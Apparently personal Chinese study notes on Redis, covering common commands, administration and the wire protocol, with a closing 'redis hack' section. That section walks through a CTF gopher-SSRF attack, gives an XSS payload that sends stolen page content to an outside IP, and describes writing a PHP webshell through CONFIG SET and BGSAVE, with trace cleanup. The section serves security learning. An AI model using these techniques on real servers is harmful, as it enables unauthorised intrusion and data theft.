# redis

 ## 一些基本命令

https://redis.io/commands



### 1. 关于字符串的命令

   - set  key value
     创建键值对
     `set hello "world"`

   - get key 
     获取键值对 
     `get hello`

   - incr  key
     数字增加1
     `incr number`

   - del key
     删除数据
     `del hello`

 ### 2. expire key seconds
   设置过期时间()
   `expire hello 120`

 ### 3. ttl key
   查看过期时间,-1代表永不过期,-2代表不存在
   `ttl hello`

 ### 4. 关于列表(list)类型的指令

   - rpush list_key value
     将值放在列表的末尾
     `rpush friends Alice`

   - lpush list_key value
     将值放在列表的头
     `lpush friends Asm`

   - lrange key begin end
     取出key[begin]-key[end]之间的值

```
LRANGE friends 0 -1 => 1) "Sam", 2) "Alice", 3) "Bob"
LRANGE friends 0 1 => 1) "Sam", 2) "Alice"
LRANGE friends 1 2 => 1) "Alice", 2) "Bob"
```


   - llen key
     返回列表长度
     `llen friends`

   - lpop arr_key
     移除列表的第一个值
     `lpop friends`

   - rpop arr_key
     移除列表的最后一个值
     `rpop friends`

 ### 5. 关于集合(set)的指令

   - SADD set_key value
     将值添加到set_key里
     `SADD aset "fight"`

   - SREM set_key value
     删除集合中给定的值
     `SREM aset "fight"`

   - SISMEMBER set_key value
     查看给定的值是否在集合里
     `SISMEMBER aset fight`

   - SMEMBERS set_key
     列出集合里所有的值
     `SMEMBERS aset`

   - SUNION set_key1 set_key2

     将set_key1和set_key2里的值联合显示,并不会改变集合里

```
     SADD hello 1
     SADD hello 2
     SUNION aset hello
```

 ### 6. 关于有序集合(sorted set)的指令

   - ZADD sset_key associated_score value
     向sset_key中添加值
     ` ZADD hackers 1912 "Alan Turing"`
   - ZRANGE sskey begin_index end_index

 ### 7. 关于哈希表的指令

    - HSET hkey filedname value
      设置哈希表hkey的filedname=value

```
HSET user:1000 name "John Smith"
HSET user:1000 email "john.smith@example.com"
HSET user:1000 password "s3cret"
```
- HGETALL
获得哈希表里的所有值
  

`HGETALL user:1000`

- HMSET hkey ...
  
      一次性设置多个hash表的filed
      `HMSET user:1001 name "Mary Jones" password "hidden" email "mjones@example.com"`
  
    - HGET hkey filedname
    
      获取hkey中filedname的值
      ` HGET user:1001 name`
    
    - HINCRBY hkey filedname increasement
      令hkey中的filedname的值增加10

```
       HSET user:1000 visits 10
          HINCRBY user:1000 visits 1 => 11
          HINCRBY user:1000 visits 10 => 21
```
    - HDEL
      ` HDEL user:1000 visits`

 ### 8. info

    查看服务器信息
 ### 9. select index

    切换数据库
 ### 10. flushdb

    清除数据库里的所有数据
 ### 11. 事务

    在实际开发时，往往会需要运行具有原子性的一组命令。若要这样做，首先要执行`multi`命令，紧随其后的是所有你想要执行的命令（作为事务的一部分），最后执行`exec`命令去实际执行命令，或者使用`discard`命令放弃执行命令。Redis的事务功能保证了什么？
    - 事务中的命令将会按顺序地被执行
    - 事务中的命令将会如单个原子操作般被执行（没有其它的客户端命令会在中途被执行）
    - 事务中的命令要么全部被执行，要么不会执行
 ### 12. keys
    `keys pattern`
    `keys`命令。这个命令需要一个模式，然后查找所有匹配的关键字。这个命令看起来很适合一些任务，但这不应该用在实际的产品代码里。为什么？因为这个命令通过线性扫描所有的关键字来进行匹配。或者，简单地说，这个命令太慢了。
 ### 13. Publication and SubscriptionsRedis
对于消息发布和频道订阅有着一流的支持。你可以打开第二个`redis-cli`窗口，去尝试一下这些功能。在第一个窗口里订阅一个频道（我们会称它为`warnings`）：

```
subscribe warnings
```

其将会答复你订阅的信息。现在，在另一个窗口，发布一条消息到`warnings`频道：
    
```
publish warnings "it's over 9000!"
```

如果你回到第一个窗口，你应该已经接收到`warnings`频道发来的消息。
    
你可以订阅多个频道（`subscribe channel1 channel2 ...`），订阅一组基于模式的频道（`psubscribe warnings:*`），以及使用`unsubscribe`和`punsubscribe`命令停止监听一个或多个频道，或一个频道模式。
    
    最后，可以注意到`publish`命令的返回值是1，这指出了接收到消息的客户端数量。
 ### 14. Monitor and Slow Log`onitor`
命令可以让你查看Redis正在做什么。这是一个优秀的调试工具，能让你了解你的程序如何与Redis进行交互。在两个`redis-cli`窗口中选一个（如果其中一个还处于订阅状态，你可以使用`unsubscribe`命令退订，或者直接关掉窗口再重新打开一个新窗口）键入`monitor`命令。在另一个窗口，执行任何其他类型的命令（例如`get`或`set`命令）。在第一个窗口里，你应该可以看到这些命令，包括他们的参数。

在实际生产环境里，你应该谨慎运行`monitor`命令，这真的仅仅就是一个很有用的调试和开发工具。除此之外，没有更多要说的了。
    
随同`monitor`命令一起，Redis拥有一个`slowlog`命令，这是一个优秀的性能剖析工具。其会记录执行时间超过一定数量**微秒**的命令。在下一章节，我们会简略地涉及如何配置Redis，现在你可以按下面的输入配置Redis去记录所有的命令：
    
```
config set slowlog-log-slower-than 0
```

然后，执行一些命令。最后，你可以检索到所有日志，或者检索最近的那些日志：
    
```
slowlog get
slowlog get 10
```

通过键入`slowlog len`，你可以获取延迟日志里的日志数量。
    
对于每个被你键入的命令，你应该查看4个参数：
    
- 一个自动递增的id
- 一个Unix时间戳，表示命令开始运行的时间
- 一个微妙级的时间，显示命令运行的总时间
- 该命令以及所带参数
  
    延迟日志保存在存储器中，因此在生产环境中运行（即使有一个低阀值）也应该不是一个问题。默认情况下，它将会追踪最近的1024个日志。
 ### 15.  sort

`sort`命令是Redis最强大的命令之一。它让你可以在一个列表、集合或者分类集合里对值进行排序（分类集合是通过标记来进行排序，而不是集合里的成员）。下面是一个`sort`命令的简单用例：
	

```
rpush users:leto:guesses 5 9 10 2 4 10 19 2
sort users:leto:guesses
```

这将返回进行升序排序后的值。这里有一个更高级的例子：
	
```
sadd friends:ghanima leto paul chani jessica alia duncan
sort friends:ghanima limit 0 3 desc alpha
```

上面的命令向我们展示了，如何对已排序的记录进行分页（通过`limit`），如何返回降序排序的结果（通过`desc`），以及如何用字典序排序代替数值序排序（通过`alpha`）。
	
`sort`命令的真正力量是其基于引用对象来进行排序的能力。早先的时候，我们说明了列表、集合和分类集合很常被用于引用其他的Redis对象，`sort`命令能够解引用这些关系，而且通过潜在值来进行排序。例如，假设我们有一个Bug追踪器能让用户看到各类已存在问题。我们可能使用一个集合数据结构去追踪正在被监视的问题：
	
```
sadd watch:leto 12339 1382 338 9338
```

你可能会有强烈的感觉，想要通过id来排序这些问题（默认的排序就是这样的），但是，我们更可能是通过问题的严重性来对这些问题进行排序。为此，我们要告诉Redis将使用什么模式来进行排序。首先，为了可以看到一个有意义的结果，让我们添加多一点数据：
	
```
set severity:12339 3
set severity:1382 2
set severity:338 5
set severity:9338 4
```

要通过问题的严重性来降序排序这些Bug，你可以这样做：
	
```
sort watch:leto by severity:* desc
```

Redis将会用存储在列表（集合或分类集合）中的值去替代模式中的`*`（通过`by`）。这会创建出关键字名字，Redis将通过查询其实际值来排序。
	
在Redis里，虽然你可以有成千上万个关键字，类似上面展示的关系还是会引起一些混乱。幸好，`sort`命令也可以工作在散列数据结构及其相关域里。相对于拥有大量的高层次关键字，你可以利用散列：
	
```
hset bug:12339 severity 3
hset bug:12339 priority 1
hset bug:12339 details "{id: 12339, ....}"
	
hset bug:1382 severity 2
hset bug:1382 priority 2
hset bug:1382 details "{id: 1382, ....}"

hset bug:338 severity 5
hset bug:338 priority 3
hset bug:338 details "{id: 338, ....}"

hset bug:9338 severity 4
hset bug:9338 priority 2
hset bug:9338 details "{id: 9338, ....}"
```

所有的事情不仅变得更为容易管理，而且我们能通过`severity`或`priority`来进行排序，还可以告诉`sort`命令具体要检索出哪一个域的数据：
	
```
sort watch:leto by bug:*->priority get bug:*->details
```

相同的值替代出现了，但Redis还能识别`->`符号，用它来查看散列中指定的域。里面还包括了`get`参数，这里也会进行值替代和域查看，从而检索出Bug的细节（details域的数据）。
	
对于太大的集合，`sort`命令的执行可能会变得很慢。好消息是，`sort`命令的输出可以被存储起来：

```
sort watch:leto by bug:*->priority get bug:*->details store watch_by_priority:leto
```

使用我们已经看过的`expiration`命令，再结合`sort`命令的`store`能力，这是一个美妙的组合。

## redis 管理

### 配置（Configuration）

当你第一次运行Redis的服务器，它会向你显示一个警告，指`redis.conf`文件没有被找到。这个文件可以被用来配置Redis的各个方面。一个充分定义（well-documented）的`redis.conf`文件对各个版本的Redis都有效。范例文件包含了默认的配置选项，因此，对于想要了解设置在干什么，或默认设置是什么，都会很有用

因为这个文件已经是充分定义（well-documented），我们就不去再进行设置了。

除了通过`redis.conf`文件来配置Redis，`config set`命令可以用来对个别值进行设置。实际上，在将`slowlog-log-slower-than`设置为0时，我们就已经使用过这个命令了。

还有一个`config get`命令能显示一个设置值。这个命令支持模式匹配，因此如果我们想要显示关联于日志（logging）的所有设置，我们可以这样做：

```
config get *log*
```

### 验证（Authentication）

通过设置`requirepass`（使用`config set`命令或`redis.conf`文件），可以让Redis需要一个密码验证。当`requirepass`被设置了一个值（就是待用的密码），客户端将需要执行一个`auth password`命令。

一旦一个客户端通过了验证，就可以在任意数据库里执行任何一条命令，包括`flushall`命令，这将会清除掉每一个数据库里的所有关键字。通过配置，你可以重命名一些重要命令为混乱的字符串，从而获得一些安全性。

```
rename-command CONFIG 5ec4db169f9d4dddacbfb0c26ea7e5ef
rename-command FLUSHALL 1041285018a942a4922cbf76623b741e
```

或者，你可以将新名字设置为一个空字符串，从而禁用掉一个命令。

### 复制（Replication）

Redis支持复制功能，这意味着当你向一个Redis实例（Master）进行写入时，一个或多个其他实例（Slaves）能通过Master实例来保持更新。可以在配置文件里设置`slaveof`，或使用`slaveof`命令来配置一个Slave实例。对于那些没有进行这些设置的Redis实例，就可能一个Master实例。

为了更好保护你的数据，复制功能拷贝数据到不同的服务器。复制功能还能用于改善性能，因为读取请求可以被发送到Slave实例。他们可能会返回一些稍微滞后的数据，但对于大多数程序来说，这是一个值得做的折衷。

遗憾的是，Redis的复制功能还没有提供自动故障恢复。如果Master实例崩溃了，一个Slave实例需要手动的进行升级。如果你想使用Redis去达到某种高可用性，对于使用心跳监控（heartbeat monitoring）和脚本自动开关（scripts to automate the switch）的传统高可用性工具来说，现在还是一个棘手的难题。

### 备份文件（Backups）

备份Redis非常简单，你可以将Redis的快照（snapshot）拷贝到任何地方，包括S3、FTP等。默认情况下，Redis会把快照存储为一个名为`dump.rdb`的文件。在任何时候，你都可以对这个文件执行`scp`、`ftp`或`cp`等常用命令。

有一种常见情况，在Master实例上会停用快照以及单一附加文件（aof），然后让一个Slave实例去处理备份事宜。这可以帮助减少Master实例的载荷。在不损害整体系统响应性的情况下，你还可以在Slave实例上设置更多主动存储的参数。

#### AOF和RDB的区别

aof是储存我们输入的命令,而RDB是保存数据库的快照

## redis protocol

https://redis.io/topics/protocol

```
--每一行都要使用分隔符(CRLF)
--一条命令用”*”开始，同时用数字作为参数，需要分隔符(“*1”+ CRLF)
--我们有多个参数时：
-字符：以”$”开头+字符的长度（＂$4＂+CRLF）+字符串(“TIME”+CRLF)
-整数：以”:”开头+整数的ASCII码(“:42”+CRLF)
```



## redis hack

redis常用端口:6379

当我们访问6379端口时

```
-ERR wrong number of arguments for 'get' command
-ERR unknown command 'Host:'
-ERR unknown command 'Accept:'
-ERR unknown command 'Accept-Encoding:'
-ERR unknown command 'Via:'
-ERR unknown command 'Cache-Control:'
-ERR unknown command 'Connection:'
```

这个输出证明了HTTP的GET请求方法，在redis中作为一个有效的命令执行了，但是没有给这个命令提供正确的参数。其他的HTTP请求的没有匹配到Redis命令，出现了很多”unknown command”的错误信息。

`echo -e  '*3\r\n$3\r\nSET\r\n$10\r\nwith_space\r\n$11\r\nI am boring\r\n' | nc -n -q 1 127.0.0.1 6379 +OK`

成功执行set命令

### 文章

https://www.secpulse.com/archives/5366.html

### 利用ssrf和gopher协议

#### gopher 协议

Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。在ssrf时常常会用到gopher协议构造post包来攻击内网应用。其实构造方法很简单，与http协议很类似。不同的点在于gopher协议没有默认端口，所以需要指定web端口，而且需要指定post方法。回车换行使用%0d%0a。注意post参数之间的&分隔符也要进行url编码。

基本协议格式：

```
URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流
```

#### 实例:

https://xssrf.hackme.inndy.tw/

1. 找到xss注入点
   ![](http://ww1.sinaimg.cn/large/006pWR9agy1g6dg9q9e7aj30hd0lbq3o.jpg)
   ![](http://ww1.sinaimg.cn/large/006pWR9agy1g6dge5wtvlj30cx027glk.jpg)

2. ssrf代码
   利用这个注入点读取html源代码发现,requests.php处的参数url可以造成ssrf

   ```javascript
   xmlhttp=new XMLHttpRequest();
   xmlhttp.onreadystatechange=function()
   {
       if (xmlhttp.readyState==4 && xmlhttp.status==200)
       {
           document.location='http://39.108.164.219:60000/?'+btoa(xmlhttp.responseText);
       }
   }
   xmlhttp.open("POST","request.php",true);
   xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
   xmlhttp.send("url=gopher://127.0.0.1:25566/....");
   ```

   

3. 上一题提示redis运行在25566

   根据协议构造`*1\r\n$4\r\nping\r\n`来测试是否成功连接
   将数据转换成gopher协议的格式

   `%2a1%0d%0a%244%0d%0aping%0d%0a`

   因为会解码两次还要再编码一次

   `%252a1%250d%250a%25244%250d%250aping%250d%250a`

   最终的样子:

   `gopher://127.0.0.1:25566/_%252a1%250d%250a%25244%250d%250aping%250d%250a`
   ![](http://ww1.sinaimg.cn/large/006pWR9agy1g6dic4lwopj309s02f3yc.jpg)

   成功

4. 
   
   接着 
   keys *:![1566834398847](C:\Users\蔡建斌\AppData\Roaming\Typora\typora-user-images\1566834398847.png)
   type flag:![](http://ww1.sinaimg.cn/large/006pWR9agy1g6dij5r4s2j30920110si.jpg)
   lrange flag 0 -1:
   ![](http://ww1.sinaimg.cn/large/006pWR9agy1g6dir3rr6wj301m0lmq2r.jpg)
   FLAG{Redis without authentication is easy to exploit}

### 小技巧

1. eval执行 lua脚本
   利用dofile()进行文件读取

2. 利用rbd写webshell

   - 修改备份文件的位置

     ```
     CONFIG SET dir /var/www/uploads
     CONFIG SET dbfilename sh.php
     ```

   - 把payload插入数据库

     ```
     SET payload “could be php or shell or whatever”
     ```

   - 把数据导出到硬盘

     ```
     BGSAVE
     ```

   - 清除痕迹

     ```
     DEL payload
     CONFIG SET dir /var/redis
     CONFIG SET dbfilename dump.rdb
     ```

